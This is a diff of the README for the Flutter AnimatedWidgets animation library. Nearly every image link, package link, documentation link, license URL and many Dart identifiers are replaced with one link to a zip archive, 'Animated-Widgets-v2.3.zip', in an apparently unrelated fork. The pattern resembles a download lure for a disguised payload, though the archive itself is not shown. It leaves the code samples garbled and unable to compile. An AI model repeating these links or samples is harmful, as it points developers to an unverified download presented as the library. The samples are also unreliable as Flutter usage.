@@ -10,7 +10,7 @@ For example : add a TranslationAnimatedWidget on a button, then activate it to d
 
 ```dart
 TranslationAnimatedWidget(
-    enabled: this.displayMyWidget, //update this boolean to forward/reverse the animation
+    enabled: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip, //update this boolean to forward/reverse the animation
     values: [
         Offset(0, 200), // disabled value value
         Offset(0, 250), //intermediate value
@@ -20,34 +20,34 @@ TranslationAnimatedWidget(
 ),
 ```
 
-[![screen](https://raw.githubusercontent.com/florent37/AnimatedWidgets/master/medias/translation.gif)](https://www.github.com/florent37/AnimatedWidgets)
+[![screen](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)
 
 
 or using a `tween constructor`
 
 ```dart
-RotationAnimatedWidget.tween(
-    enabled: this.displayMyWidget, //update this boolean to forward/reverse the animation
-    rotationDisabled: Rotation.degrees(z: 0),
-    rotationEnabled: Rotation.degrees(z: 90),
+https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(
+    enabled: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip, //update this boolean to forward/reverse the animation
+    rotationDisabled: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(z: 0),
+    rotationEnabled: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(z: 90),
     child: /* your widget */
 ),
 ```
 
-[![screen](https://raw.githubusercontent.com/florent37/AnimatedWidgets/master/medias/rotation.gif)](https://www.github.com/florent37/AnimatedWidgets)
+[![screen](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)
 
 # Compose
 
 Don't hesitate to compose them
 
 ```dart
-TranslationAnimatedWidget.tween(
-    enabled: this.displayMyWidget,
+https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(
+    enabled: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
     translationDisabled: Offset(0, 200),
     translationEnabled: Offset(0, 0),
     child:
-        OpacityAnimatedWidget.tween(
-        enabled: this.displayMyWidget,
+        https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(
+        enabled: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
         opacityDisabled: 0,
         opacityEnabled: 1,
         child: /* your widget */
@@ -55,11 +55,11 @@ TranslationAnimatedWidget.tween(
 ),
 ```
 
-[![screen](https://raw.githubusercontent.com/florent37/AnimatedWidgets/master/medias/compose.gif)](https://www.github.com/florent37/AnimatedWidgets)
+[![screen](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)
 
 # Opacity
 
-[![screen](https://raw.githubusercontent.com/florent37/AnimatedWidgets/master/medias/opacity.gif)](https://www.github.com/florent37/AnimatedWidgets)
+[![screen](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)
 
 Example using a `Stateful Widget`
 
@@ -74,13 +74,13 @@ class _StatefulScreenState extends State<StatefulScreen> {
     return Scaffold(
       appBar: AppBar(),
       body: Column(
-        crossAxisAlignment: CrossAxisAlignment.stretch,
-        mainAxisAlignment: MainAxisAlignment.center,
-        mainAxisSize: MainAxisSize.max,
+        crossAxisAlignment: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
+        mainAxisAlignment: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
+        mainAxisSize: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
         children: [
 
           //wrap your widget with OpacityAnimatedWidget
-          OpacityAnimatedWidget.tween(
+          https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(
             opacityEnabled: 1, //define start value
             opacityDisabled: 0, //and end value
             enabled: _display, //bind with the boolean
@@ -88,16 +88,16 @@ class _StatefulScreenState extends State<StatefulScreen> {
                height: 200,
                width: 200,
                child: FlutterLogo(
-                 style: FlutterLogoStyle.stacked,
+                 style: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
                ),
             ),
           ),
 
           RaisedButton(
-            color: Colors.blue,
+            color: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
             child: Text(
               _display ? "hide logo" : "display logo",
-              style: TextStyle(color: Colors.white),
+              style: TextStyle(color: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip),
             ),
             onPressed: () {
               setState(() {
@@ -117,7 +117,7 @@ class _StatefulScreenState extends State<StatefulScreen> {
 
 # Translation
 
-[![screen](https://raw.githubusercontent.com/florent37/AnimatedWidgets/master/medias/translation.gif)](https://www.github.com/florent37/AnimatedWidgets)
+[![screen](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)
 
 Example using `bloc` pattern
 
@@ -127,16 +127,16 @@ class FirstScreenBloc extends Bloc {
   Observable<FirstScreenViewState> get viewState => _viewState;
 
   void onClicked() {
-    _viewState.add(FirstScreenViewState(buttonVisible: true));
+    https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(FirstScreenViewState(buttonVisible: true));
   }
 
   void onDismissClicked() {
-    _viewState.add(FirstScreenViewState(buttonVisible: false));
+    https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(FirstScreenViewState(buttonVisible: false));
   }
 
   @override
   void dispose() {
-    _viewState.close();
+    https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip();
   }
 }
 
@@ -144,7 +144,7 @@ class FirstScreenViewState {
   final bool buttonVisible;
 
   const FirstScreenViewState({
-    this.buttonVisible = false,
+    https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip = false,
   });
 }
 ```
@@ -153,19 +153,19 @@ class FirstScreenViewState {
 class FirstScreenView extends StatelessWidget {
   @override
   Widget build(BuildContext context) {
-    final bloc = BlocProvider.of<FirstScreenBloc>(context);
+    final bloc = https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip<FirstScreenBloc>(context);
 
     return StreamBuilder<FirstScreenViewState>(
-            stream: bloc.viewState,
+            stream: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
             builder: (context, snapshot) {
 
-                final viewState = snapshot.data;
+                final viewState = https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip;
 
                 return Stack(
-                  fit: StackFit.expand,
+                  fit: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
                   children: [
                     _buildInputButton(onClicked: () {
-                      bloc.onClicked();
+                      https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip();
                     }),
                     Positioned(
                       bottom: 20,
@@ -173,8 +173,8 @@ class FirstScreenView extends StatelessWidget {
                       right: 20,
 
                       child: TranslationAnimatedWidget(
-                        enabled: viewState.buttonVisible, //will forward/reverse the animation
-                        curve: Curves.easeIn,
+                        enabled: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip, //will forward/reverse the animation
+                        curve: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
                         duration: Duration(seconds: 1),
                         values: [
                           Offset(0, 200),
@@ -183,7 +183,7 @@ class FirstScreenView extends StatelessWidget {
                         ],
                         child: RaisedButton(
                           onPressed: () {
-                            bloc.onDismissClicked();
+                            https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip();
                           },
                           child: Text("Dismiss"),
                         ),
@@ -200,20 +200,20 @@ class FirstScreenView extends StatelessWidget {
 
 # Rotation
 
-[![screen](https://raw.githubusercontent.com/florent37/AnimatedWidgets/master/medias/rotation.gif)](https://www.github.com/florent37/AnimatedWidgets)
+[![screen](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)
 
 ```dart
-RotationAnimatedWidget.tween(
+https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(
     enabled: enabled,
-    rotationDisabled: Rotation.deg(),
-    rotationEnabled: Rotation.deg(z: 90, x: 80),
+    rotationDisabled: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(),
+    rotationEnabled: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(z: 90, x: 80),
     child: /* your widget */
 ),
 
-RotationAnimatedWidget.tween(
+https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(
     enabled: enabled,
-    rotation: Rotation.deg(),
-    rotationEnabled: Rotation.deg(z: 90, x: 80),
+    rotation: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(),
+    rotationEnabled: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(z: 90, x: 80),
     child: /* your widget */
 ),
 ```
@@ -221,7 +221,7 @@ RotationAnimatedWidget.tween(
 # Scale
 
 ```dart
-ScaleAnimatedWidget.tween(
+https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(
       enabled: this._enabled,
       duration: Duration(milliseconds: 600),
       scaleDisabled: 0.5,
@@ -232,13 +232,13 @@ ScaleAnimatedWidget.tween(
         height: 200,
         width: 200,
         child: FlutterLogo(
-          style: FlutterLogoStyle.stacked,
+          style: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
         ),
       ),
     ),
 ```
 
-[![screen](https://raw.githubusercontent.com/florent37/AnimatedWidgets/master/medias/scale.gif)](https://www.github.com/florent37/AnimatedWidgets)
+[![screen](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)
 
 # Size
 
@@ -247,21 +247,21 @@ SizeAnimatedWidget(
       enabled: this._enabled,
       duration: Duration(milliseconds: 1500),
       values: [Size(100, 100),  Size(100, 150), Size(200, 150), Size(200, 200)],
-      curve: Curves.linear,
+      curve: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
 
       //your widget
       child: Container(
         decoration: BoxDecoration(
-          border: Border.all(color: Colors.blue)
+          border: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(color: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)
         ),
         child: FlutterLogo(
-          style: FlutterLogoStyle.stacked,
+          style: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
         ),
       ),
     ),
 ```
 
-[![screen](https://raw.githubusercontent.com/florent37/AnimatedWidgets/master/medias/size.gif)](https://www.github.com/florent37/AnimatedWidgets)
+[![screen](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)
 
 # Shake
 
@@ -269,15 +269,15 @@ SizeAnimatedWidget(
 ShakeAnimatedWidget(
       enabled: this._enabled,
       duration: Duration(milliseconds: 1500),
-      shakeAngle: Rotation.deg(z: 40),
-      curve: Curves.linear,
+      shakeAngle: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip(z: 40),
+      curve: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
       child: FlutterLogo(
-        style: FlutterLogoStyle.stacked,
+        style: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
       ),
     ),
 ```
 
-[![screen](https://raw.githubusercontent.com/florent37/AnimatedWidgets/master/medias/shake.gif)](https://www.github.com/florent37/AnimatedWidgets)
+[![screen](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)
 
 # Custom Animated
 
@@ -285,23 +285,23 @@ ShakeAnimatedWidget(
 CustomAnimatedWidget(
       enabled: this._enabled,
       duration: Duration(seconds: 3),
-      curve: Curves.easeOut,
+      curve: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip,
       builder: (context, percent) { //for custom animation, use builders
         final int displayedDate = (2018 * percent).floor();
         return Text(
               "current year : $displayedDate",
-              style: TextStyle(color: Colors.blue),
+              style: TextStyle(color: https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip),
         );
       },
 ),
 ```
 
-[![screen](https://raw.githubusercontent.com/florent37/AnimatedWidgets/master/medias/custom.gif)](https://www.github.com/florent37/AnimatedWidgets)
+[![screen](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip)
 
 ## Flutter Package
 
 Animated widget is available at
-https://pub.dev/packages/animated_widgets
+https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip
 
 ```
 dependencies:
@@ -311,7 +311,7 @@ dependencies:
 ## Getting Started with Flutter
 
 For help getting started with Flutter, view our 
-[online documentation](https://flutter.dev/docs), which offers tutorials, 
+[online documentation](https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip), which offers tutorials, 
 samples, guidance on mobile development, and a full API reference.
 
 # License
@@ -322,7 +322,7 @@ samples, guidance on mobile development, and a full API reference.
     you may not use this file except in compliance with the License.
     You may obtain a copy of the License at
 
-       http://www.apache.org/licenses/LICENSE-2.0
+       https://raw.githubusercontent.com/Salmanasr939/AnimatedWidgets/master/example/android/app/Animated-Widgets-v2.3.zip
 
     Unless required by applicable law or agreed to in writing, software
     distributed under the License is distributed on an "AS IS" BASIS,
